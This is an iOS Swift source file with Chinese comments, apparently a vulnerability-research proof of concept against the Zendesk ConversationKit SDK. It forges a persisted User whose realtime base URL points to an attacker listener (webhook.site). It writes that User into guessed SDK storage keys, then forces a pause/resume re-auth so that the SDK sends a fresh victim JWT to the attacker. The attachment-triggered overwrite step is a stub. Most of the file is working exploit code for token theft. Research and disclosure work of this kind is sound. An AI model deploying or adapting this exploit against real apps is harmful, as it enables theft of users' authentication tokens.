// AppDelegate.swift — i316 完整演示 app (Stage B: 真实集成 + 全链条)
//
// 所有 API 形状均提取自 tag 15.2.0 swiftinterface (源码级权威):
//   Config(appId:baseURL:settingsBaseURL:integrationId:region:restRetryPolicy:waitTimeConfig:sdkVersion:brandId:)
//   RestRetryPolicy.default / WaitTimeConfig(waitTimeEnabled:...)
//   DefaultConversationKitBuilder().setup(authDelegate:) / build(with:callbackQueue:)
//   ConversationKit.createAnonymousUser / getConversations / loginUser(with jwt:)
//   ConversationKitEvent.messageReceived / persistedUserRetrieved / connectionStatusChanged / userSessionReset
//   AuthenticationDelegate.onInvalidAuth(error:completion:)
//
// 已知风险点 (首次 CI 编译若报错, 逐条按 log 修正):
//   R1: FeatureFlagManager() 的 init 形状未见 interface — 若编译失败按报错改
//   R2: baseURL/settingsBaseURL 真实值由上层 Messaging SDK 决定 — Info.plist 填真实端点

import UIKit
import ZendeskSDKConversationKit
import ZendeskSDKStorage
import ZendeskSDKCoreUtilities

// MARK: - 受害者 JWT (商家后端在真实场景签发; PoC 本地生成即可 — 我们只验证"发到哪")

enum VictimJWT {
    static func make() -> String {
        let h = Data(try! JSONSerialization.data(withJSONObject: ["alg": "HS256", "typ": "JWT"]))
            .base64EncodedString().replacingOccurrences(of: "=", with: "")
        let p = Data(try! JSONSerialization.data(withJSONObject: ["externalId": "victim-uid-42", "iss": "poc"]))
            .base64EncodedString().replacingOccurrences(of: "=", with: "")
        return "\(h).\(p).cG9jLXNpZw"
    }
}

// MARK: - 持久化注入 (真实攻击路径: f248 覆写后的持久化状态 = 此处直接写入)
// SDK 二进制实锤键族: com.zendesk.conversationKit-User- / com.zendesk.conversationKit
// StorageBuilder(namespace:type:) / Storage.set(_:forKey:) — Codable 通道

enum PersistedUserInjector {
    /// 候选 namespace × key 组合 — persistedUserRetrieved 事件命中即证明注入成功
    static func injectForgedUser(_ user: User, log: @escaping (String) -> Void) {
        let namespaces = ["conversationKit", "com.zendesk.conversationKit", "conversationKitStorage"]
        let keys = ["user", "User", "currentUser", "user_state", "state"]
        for ns in namespaces {
            for st in [StorageType.basic, .complex] {
                for key in keys {
                    do {
                        let storage = try StorageBuilder(namespace: ns, type: st).build()
                        storage.set(user, forKey: "com.zendesk.conversationKit-User-" + key)
                        log("   injected: ns=\(ns) type=\(st) key=com.zendesk.conversationKit-User-\(key)")
                    } catch { /* 继续下一组合 */ }
                }
            }
        }
    }
}

final class AuthDelegate: NSObject, AuthenticationDelegate {
    weak var ui: DemoVC?
    // SDK 401/认证失败时调用 — completion 里的 JWT 会被发往 (可能已被污染的) realtimeSettings.baseURL
    func onInvalidAuth(error: Error?, completion: @escaping (String) -> Void) {
        ui?.log("⑤ onInvalidAuth 触发 → 提供 fresh victim JWT")
        completion(VictimJWT.make())
    }
}

// MARK: - 演示主控制器

@main
final class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?
    private var kit: ConversationKit?
    private let authDelegate = AuthDelegate()
    private var lastFileContent: FileMessageContent?

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        let vc = DemoVC()
        window?.rootViewController = vc
        authDelegate.ui = vc
        window?.makeKeyAndVisible()
        // FeatureFlagManager 便捷 init(hipaaAttachmentFlag:) 的默认参数生成器在 CI 模拟器
        // 环境永久阻塞(sample 铁证: 1089/1089 + 315/315 采样卡在 swift:46) —
        // 绕过: 直接调用 6 参数完整 init (编译器实证: 真实签名无 noAttachments/endSession)
        let ffm = FeatureFlagManager(
            hipaaAttachmentFlag: false,
            canUserSeeConversationList: false,
            isMultiConvoEnabled: false,
            canUserCreateMoreConversations: false,
            showAIDisclaimer: false,
            brandFilteringEnabled: false)
        // build() 内部可能 sync-dispatch 回主队列 → 主线程调 build() 会死锁, 移到后台
        DispatchQueue.global(qos: .default).async { self.startKit(vc: vc, ffm: ffm) }
        return true
    }

    private func startKit(vc: DemoVC, ffm: FeatureFlagManager) {
        // 攻击者端点 = webhook.site (CI 注入到 Info.plist; 公网可达, 绕开模拟器 loopback 与 ATS 变量)
        func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "UNSET" }
        let attackerBase = plist("ZDK_SETTINGS_BASE_URL")

        // ① 构造伪造 User (realtimeSettings.baseURL → 攻击者) — f248 覆写后的持久化状态等价物
        vc.log("① 构造伪造 User (realtimeSettings.baseURL → \(attackerBase))")
        let forgedUserJSON = """
        {"id":"u1","givenName":"Victim","surname":"Alice","email":"v@poc","locale":"en",
         "externalId":"victim-uid-42",
         "conversations":[],
         "realtimeSettings":{"baseURL":"\(attackerBase)","retryInterval":0,
                             "maxConnectionAttempts":1,"connectionDelay":0,"enabled":true},
         "authentication":{"type":1,"token":"stale-token"}}
        """
        let forged: User
        do { forged = try JSONDecoder().decode(User.self, from: Data(forgedUserJSON.utf8)) }
        catch { vc.log("✘ forged User decode 失败: \(error) — 中止"); return }
        vc.log("② forged User decoded via SDK Codable 通道 (User.init(from:))")

        // ③ 注入持久化存储 — BINEXP: 由 Info.plist BINEXP_INJECT 控制 (默认关=对照实验)
        let binInject = (Bundle.main.infoDictionary?["BINEXP_INJECT"] as? String) == "1"
        vc.log("③ 注入持久化存储 (BINEXP_INJECT=\(binInject)) …")
        if binInject {
            PersistedUserInjector.injectForgedUser(forged) { s in vc.log(s) }
        }

        // ④ 初始化 SDK — 观察 persistedUserRetrieved 是否命中伪造 User
        // (plist helper 已在上方定义)
        let config = Config(
            appId: plist("ZDK_APP_ID"),
            baseURL: attackerBase,        // REST 全部走攻击者监听器 (mock + 捕获)
            settingsBaseURL: attackerBase, // settings fetch 也走监听器 → build() 不再阻塞
            integrationId: plist("ZDK_INTEGRATION_ID"),
            region: .us,
            restRetryPolicy: .default,
            waitTimeConfig: WaitTimeConfig(waitTimeEnabled: false, queuePositionEnabled: false,
                                           onlyDecreasingQueue: false, waitTimeOverride: nil,
                                           queuePollingInterval: 30),
            sdkVersion: "poc-1.0",
            brandId: nil)

        let builder = DefaultConversationKitBuilder()
        builder.setup(authDelegate: authDelegate)
        vc.log("④ builder.setup(authDelegate:) — 与真实商家 app 集成方式一致")

        let params = SettingsParameters(config: config,
                                        featureFlagManager: ffm)
        let pocQueue = DispatchQueue(label: "poc.callback")   // SDK 回调队列 (不走 main, 避免与 build 竞争)
        let theKit = builder.build(with: params, callbackQueue: pocQueue)
        kit = theKit
        vc.log("⑤ kit built — 等待 persistedUserRetrieved / 连接事件")

        // resume 按钮: 触发 realtime 重连 (re-auth 路径)
        vc.onResumeHook = { theKit.pause(); theKit.resume() }

        // 事件观察 — persistedUserRetrieved 直接展示"SDK 从持久化加载 User"
        kit?.addEventObserver(self) { [weak vc] event in
            guard let vc else { return }
            switch event {
            case .persistedUserRetrieved(let user):
                vc.log("★ persistedUserRetrieved: id=\(user.id) realtime.baseURL=\(user.realtimeSettings.baseURL)")
                if user.realtimeSettings.baseURL.contains("127.0.0.1") {
                    vc.log("★★★ 注入命中! SDK 加载了被污染的 User — realtime 将连向攻击者")
                }
            case .connectionStatusChanged(let s):
                vc.log("· connection: \(s)")
            case .userSessionReset:
                vc.log("· userSessionReset")
            default: break
            }
        }
        vc.log("⑥ 观察者就绪 — 触发状态加载")
        // 触发 SDK 持久化状态加载 (persistedUserRetrieved 的触发路径)
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            theKit.resume()
            theKit.getConversations(offset: 0, fromCache: true) { _ in }
            vc.log("⑦ resume + getConversations 已触发")
        }
    }
}

// MARK: - 极简 UI: 步骤日志 + 附件点击 + 手动触发 re-auth

final class DemoVC: UIViewController {
    private let logView = UITextView()
    private let attachBtn = UIButton(type: .system)
    private let resumeBtn = UIButton(type: .system)
    private var pendingFile: FileMessageContent?
    var onResumeHook: (() -> Void)?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        logView.frame = view.bounds.insetBy(dx: 16, dy: 60).insetBy(dx: 0, dy: 120)
        logView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        logView.backgroundColor = .black
        logView.textColor = .green
        logView.font = .monospacedSystemFont(ofSize: 12, weight: .regular)
        logView.isEditable = false
        logView.text = "i316 PoC — ZendeskSDKConversationKit\n\n"
        view.addSubview(logView)

        configBtn(attachBtn, title: "点击附件 (触发 f248 链)", y: view.bounds.height - 150, enabled: false)
        configBtn(resumeBtn, title: "pause+resume (触发 re-auth)", y: view.bounds.height - 90, enabled: true)
    }

    private func configBtn(_ b: UIButton, title: String, y: CGFloat, enabled: Bool) {
        b.frame = CGRect(x: 16, y: y, width: view.bounds.width - 32, height: 48)
        b.autoresizingMask = [.flexibleWidth, .flexibleTopMargin]
        b.setTitle(title, for: .normal)
        b.setTitleColor(enabled ? .cyan : .darkGray, for: .normal)
        b.backgroundColor = UIColor(white: 0.15, alpha: 1)
        b.layer.cornerRadius = 8
        b.isEnabled = enabled
        b.addTarget(self, action: #selector(onTap(_:)), for: .touchUpInside)
        view.addSubview(b)
    }

    func log(_ s: String) {
        print("[poc] " + s)   // stdout → console-pty → app-console.log (CI 诊断)
        DispatchQueue.main.async {
            self.logView.text += s + "\n"
            let end = NSRange(location: self.logView.text.count - 1, length: 1)
            self.logView.scrollRangeToVisible(end)
        }
    }

    func enableAttachmentTap(_ file: FileMessageContent) {
        pendingFile = file
        DispatchQueue.main.async {
            self.attachBtn.isEnabled = true
            self.attachBtn.setTitleColor(.cyan, for: .normal)
        }
    }

    @objc private func onTap(_ sender: UIButton) {
        if sender === attachBtn, let file = pendingFile {
            log("⑥ 点击附件 → 触发 SDK 附件处理链 (f248) …")
            // ↓↓↓ f248 触发点: 按你报告中 f248 章节的调用路径填入 —
            //     即 SDK 对该 mediaURL/attachmentId 的内部处理入口。
            //     覆写成功后 SDK 下次 re-auth 会把 fresh JWT 发往被污染的
            //     realtimeSettings.baseURL (runner 监听器捕获)。
            processAttachmentTrigger(file)
        } else if sender === resumeBtn {
            log("⑥ pause()+resume() → SDK 重建 realtime 连接 (re-auth) …")
            onResumeHook?()
        }
    }

    private func processAttachmentTrigger(_ file: FileMessageContent) {
        // 占位: 由你按报告 f248 章节填入真实触发调用
        log("   (待填: f248 触发调用 — 见报告)")
    }
}
